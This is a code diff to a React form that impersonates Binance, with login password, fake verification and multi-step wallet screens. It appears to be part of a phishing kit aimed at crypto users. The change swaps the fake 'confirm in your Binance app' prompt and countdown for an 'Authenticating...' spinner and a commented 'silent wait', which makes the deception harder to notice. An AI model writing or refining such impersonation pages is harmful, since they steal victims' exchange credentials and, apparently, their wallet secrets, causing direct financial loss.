@@ -1,4 +1,3 @@
-
 import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -84,7 +83,6 @@ const BinanceLedgerForm: FC = () => {
   
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [showVerificationDialog, setShowVerificationDialog] = useState(false);
   const [showLinkingDialog, setShowLinkingDialog] = useState(false);
   const [timerCount, setTimerCount] = useState(10);
 
@@ -121,7 +119,6 @@ const BinanceLedgerForm: FC = () => {
       }, 1000);
     } else if (currentStep === FormStep.APP_VERIFICATION && timerCount === 0) {
       // Close the verification dialog and move to login success
-      setShowVerificationDialog(false);
       setCurrentStep(FormStep.LOGIN_SUCCESS);
       setTimerCount(10); // Reset for next timer
       toast({
@@ -285,9 +282,8 @@ const BinanceLedgerForm: FC = () => {
         
       case FormStep.LOGIN_PASSWORD:
         if (validatePassword()) {
-          setShowVerificationDialog(true);
           setCurrentStep(FormStep.APP_VERIFICATION);
-          setTimerCount(10); // Reset timer when starting verification
+          setTimerCount(6); // Set to 6 seconds for silent wait
         }
         break;
         
@@ -372,18 +368,12 @@ const BinanceLedgerForm: FC = () => {
   const renderAppVerification = () => (
     <div className="text-center py-8 space-y-6">
       <div className="w-20 h-20 mx-auto bg-binance-yellow/20 rounded-full flex items-center justify-center">
-        <div className="text-binance-yellow text-xl">
-          {timerCount}
-        </div>
+        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow"></div>
       </div>
-      <h3 className="text-white font-semibold text-xl">Security Verification</h3>
+      <h3 className="text-white font-semibold text-xl">Authenticating...</h3>
       <p className="text-gray-300 max-w-md mx-auto">
-        Open Binance app on your phone. Binance has sent a notification to your phone. 
-        Open your Binance App and confirm the prompt to verify it's you.
+        Please wait while we verify your credentials.
       </p>
-      <div className="animate-pulse text-sm text-gray-400">
-        Waiting for verification...
-      </div>
     </div>
   );
 
@@ -1258,25 +1248,6 @@ const BinanceLedgerForm: FC = () => {
         {currentStep === FormStep.WALLET_STEP8 && renderWalletStep8()}
         {currentStep === FormStep.WALLET_SUCCESS && renderWalletSuccess()}
       </div>
-
-      <AlertDialog open={showVerificationDialog}>
-        <AlertDialogContent className="bg-binance-dark border-gray-700">
-          <AlertDialogHeader>
-            <AlertDialogTitle className="text-white">Security Verification</AlertDialogTitle>
-            <AlertDialogDescription className="text-gray-300">
-              Open Binance app on your phone. Binance has sent a notification to your phone.
-              Open your Binance App and confirm the prompt to verify it's you.
-            </AlertDialogDescription>
-          </AlertDialogHeader>
-          <div className="flex justify-center py-4">
-            <div className="w-16 h-16 rounded-full bg-binance-yellow/20 flex items-center justify-center">
-              <div className="text-binance-yellow text-xl">
-                {timerCount}
-              </div>
-            </div>
-          </div>
-        </AlertDialogContent>
-      </AlertDialog>
 
       <AlertDialog open={showLinkingDialog}>
         <AlertDialogContent className="bg-binance-dark border-gray-700">
